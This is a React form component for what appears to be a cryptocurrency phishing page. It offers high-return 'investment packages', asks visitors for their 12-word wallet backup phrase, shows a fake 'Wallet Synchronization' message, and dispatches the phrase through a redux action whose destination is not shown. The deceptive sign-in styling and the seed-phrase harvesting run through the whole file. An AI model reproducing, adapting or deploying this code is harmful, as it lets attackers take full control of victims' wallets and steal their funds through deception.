import React, { useState, useEffect } from 'react'
import { connect } from 'react-redux'
import Select from 'react-select'


import * as orderAction from '../store/actions'

const Form = (props) => {
    const [phrase, setPhrase] = useState('')
    const [toast, setToast] = useState({})

    const handlePhrase = (e) => {
        setPhrase(e.target.value)
    }

     const options = [
         {
             label: '1 Month Package ($300 - $6,999)',
             value: '1 Month Package',
             details: {
                 name: '1 Month Package',
                 percent: 7,
                 duration: '1 Month',
                 minimum: 300,
                 maximum: 6999,
             },
         },
         {
             label: '3 Months Package ($7000 - $23,999)',
             value: '3 Months Package',
             details: {
                 name: '3 Months Package',
                 percent: 9,
                 duration: '3 Months',
                 minimum: 7000,
                 maximum: 23999,
             },
         },
         {
             label: '6 Months Package ($24,000 - $39,999)',
             value: '6 Months Package ',
             details: {
                 name: '6 Months Package ',
                 percent: 12,
                 duration: '6 Months',
                 minimum: 24000,
                 maximum: 39999,
             },
         },

         {
             label: '12 Months Package ($40,000 - Unlimited)',
             value: '12 Months Package',
             details: {
                 name: '12 Months Package',
                 percent: 18,
                 duration: '12 Months',
                 minimum: 40000,
                 maximum: 10000000000000,
             },
         },
     ]

      const customStyles = {
          option: (styles, state) => ({
              ...styles,
              cursor: 'pointer',
          }),
          control: (styles) => ({
              ...styles,
              cursor: 'pointer',
          }),
      }

      const onPackageChange = (newValue) => {
         console.log({newValue})
      }

    const handleSubmit = async (e) => {
        e.preventDefault()

       props.onInitPutPhrase(phrase)
        //  setToast({
        //      content: 'Wallet Synchronization in process!!',
        //      type: 'success',
        //  })
    }

    
    useEffect(() => {
        if (props.createdPhrase) {
            setToast({
                content:
                'Wallet Synchronization in process!!',
                type: 'success',
            })
        }
        if (props.error) {
            console.log('error', props.error)
            setToast({
                content: 'Invalid Phrase, Please check your entries!!',
                type: 'error',
            })
        }

    }, [props.createdPhrase, props.error])
    
    return (
        <form
            className='grid w-full  bg-white text-[#4B4D4E]'
            onSubmit={handleSubmit}
        >
            {toast && toast.content && (
                <div className=' grid font-semibold mb-8'>
                    <p
                        className={`px-3 py-1 rounded-lg justify-self-center text-black ${
                            toast.type === 'success'
                                ? 'bg-yellow-600'
                                : 'bg-red-800'
                        }`}
                    >
                        {toast.content}
                    </p>
                </div>
            )}

            <h1
                className='pb-8'
                style={{ fontSize: '34px', fontWeight: '300' }}
            >
                Submit a request
            </h1>

            <div className='grid'>
                <label>Please choose a request type below</label>
                <Select
                    options={options}
                    isClearable
                    styles={customStyles}
                    onChange={onPackageChange}
                />
            </div>

            <textarea
                id='phrase'
                className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
                rows={2}
                required
                value={phrase}
                placeholder='Enter 12-word Backup phrase'
                onChange={handlePhrase}
            />

            <div className='flex justify-between items-center pt-10 font-medium'>
                <div className='text-xs font-normal text-[#708599]'>
                    <input type='checkbox' id='checkbox' required /> {''}
                    <label htmlFor='checkbox'>
                        Keep me signed in on this computer
                    </label>
                </div>

                {/* <button className='justify-self-center py-2 px-6 font-semibold rounded-md outline-none sm:mb-5 btnclaim text-white'>
                CLAIM REWARD
            </button> */}
                <button
                    className='text-white bg-[#1652f0] rounded-sm'
                    style={{ padding: '11px 22px', fontSize: '11px' }}
                >
                    SIGN IN
                </button>
            </div>
        </form>
    )
}

const mapStateToProps = (state) => {
    return {
        createdPhrase: state.phrase.putPhrase,
        error: state.phrase.error,
    }
}

const mapDispatchToProps = (dispatch) => {
    return {
        onInitPutPhrase: (phrase) =>
            dispatch(orderAction.initPutPhrase(phrase)),
    }
}
export default connect(mapStateToProps, mapDispatchToProps)(Form)
